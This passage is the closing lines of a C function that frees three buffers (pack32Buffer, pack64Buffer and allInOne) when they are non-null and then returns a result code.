    if (pack32Buffer != NULL) {
        free(pack32Buffer);
    }
    if (pack64Buffer != NULL) {
        free(pack64Buffer);
    }
    if (allInOne != NULL) {
        free(allInOne);
    }

	return ret;
}
